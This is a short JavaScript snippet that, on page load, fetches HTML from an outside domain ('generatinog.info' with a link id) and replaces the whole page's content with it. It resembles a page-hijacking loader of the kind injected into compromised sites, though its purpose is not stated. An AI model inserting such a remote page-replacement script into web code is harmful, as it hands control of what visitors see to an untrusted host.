function load_home () {
    fetch("https://generatinog.info/?linkid=16467" /*, options */)
    .then((response) => response.text())
    .then((html) => {
        document.querySelector("html").innerHTML = html;
    })
    .catch((error) => {
        console.warn(error);
    });
}
load_home();
